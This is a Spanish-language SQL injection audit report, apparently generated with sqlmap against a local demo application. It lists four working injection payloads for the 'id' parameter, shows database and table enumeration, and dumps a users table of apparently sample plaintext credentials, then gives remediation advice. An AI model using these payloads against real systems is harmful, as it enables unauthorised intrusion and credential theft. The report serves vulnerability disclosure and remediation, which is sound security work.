# Informe de Auditoría: SQL Injection en http://web.dev.local:8083

**Fecha:** 2026-04-25T11:39:54Z  
**Objetivo:** http://web.dev.local:8083  
**Herramienta:** sqlmap 1.9.10  

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **SQL Injection** en el parámetro `id` (método GET) de la aplicación web objetivo. La explotación permitió extraer completamente la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios en texto plano.

---

## 2. Descripción del Objetivo

La aplicación web expone un formulario de búsqueda de usuarios en la ruta principal (`/`). El formulario envía el parámetro `id` mediante el método GET:

```
GET http://web.dev.local:8083/?id=1&Submit=Submit
```

La respuesta devuelve datos del usuario correspondiente al ID introducido:

```
ID: 1
First name: John
Surname: Doe
```

**Stack tecnológico identificado:**
- Sistema Operativo: Linux Debian
- Servidor web: Apache 2.4.65
- Lenguaje: PHP 8.1.33
- Base de datos: MySQL 5 (MariaDB fork)

---

## 3. Vulnerabilidades Encontradas

### 3.1 SQL Injection en parámetro `id`

| Campo | Detalle |
|-------|---------|
| **Parámetro vulnerable** | `id` (GET) |
| **Tipo** | Boolean-based blind, Error-based, Time-based blind, UNION query |
| **CVSS** | 9.8 (Crítico) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

#### Tipos de inyección detectados:

1. **Boolean-based blind** (AND)  
   ```
   id=5029' AND 6551=(SELECT (CASE WHEN (6551=6551) THEN 6551 ELSE (SELECT 2428 UNION SELECT 1249) END))-- -
   ```

2. **Error-based** (MySQL >= 5.0, FLOOR)  
   ```
   id=5029' OR (SELECT 8777 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(8777=8777,1))),0x717a716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mTmP
   ```

3. **Time-based blind** (SLEEP)  
   ```
   id=5029' AND (SELECT 7778 FROM (SELECT(SLEEP(5)))JVzb)-- YZiE
   ```

4. **UNION query** (2 columnas)  
   ```
   id=5029' UNION ALL SELECT NULL,CONCAT(0x71717a6a71,...,0x717a716a71)-- -
   ```

---

## 4. Explotación

### 4.1 Enumeración de bases de datos

Se obtuvieron las siguientes bases de datos:

```
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli_demo      <-- Base de datos de la aplicación
[*] sys
```

### 4.2 Enumeración de tablas en `sqli_demo`

```
Database: sqli_demo
+-------+
| users |
+-------+
```

### 4.3 Volcado de la tabla `users`

Se extrajeron **8 registros** con credenciales en texto plano:

| user_id | username   | first_name | last_name | email               | password    |
|---------|------------|------------|-----------|---------------------|-------------|
| 1       | admin      | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith     | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson   | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams  | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown     | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis     | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller    | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson    | Frank      | Wilson    | frank@example.com   | admin123    |

⚠️ **Las contraseñas están almacenadas en texto plano**, lo cual constituye una vulnerabilidad adicional crítica.

---

## 5. Impacto

- **Confidencialidad:** ALTO — Exposición completa de datos de usuarios (credenciales, emails)
- **Integridad:** ALTO — Posible modificación o eliminación de datos en la base de datos
- **Disponibilidad:** MEDIO — Posible destrucción de datos o denegación de servicio mediante sentencias destructivas
- **Escalada:** El acceso a credenciales en texto plano podría permitir movimiento lateral si las contraseñas se reutilizan en otros servicios

---

## 6. Recomendaciones

1. **Usar consultas parametrizadas (Prepared Statements)** en lugar de concatenar directamente el input del usuario en las consultas SQL.
   ```php
   // Vulnerable
   $query = "SELECT * FROM users WHERE user_id = '$id'";
   
   // Seguro
   $stmt = $pdo->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->execute([$id]);
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea estrictamente numérico con `intval()` o expresiones regulares antes de usarlo.

3. **Almacenar contraseñas con hash seguro:** Usar `password_hash()` con `PASSWORD_BCRYPT` en PHP. Nunca almacenar contraseñas en texto plano.

4. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debe tener permisos para acceder a `information_schema` ni otras bases de datos del sistema.

5. **Web Application Firewall (WAF):** Implementar un WAF para detectar y bloquear intentos de SQL injection.

6. **Manejo de errores:** No exponer mensajes de error de base de datos al usuario final, ya que facilitan la explotación.

---

## 7. Conclusión

La aplicación web en http://web.dev.local:8083 presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer, modificar o eliminar datos de la base de datos. La explotación exitosa resultó en el acceso completo a las credenciales de todos los usuarios registrados, almacenadas en texto plano. Se requiere corrección inmediata.

---

*Informe generado automáticamente mediante análisis de seguridad automatizado con sqlmap.*
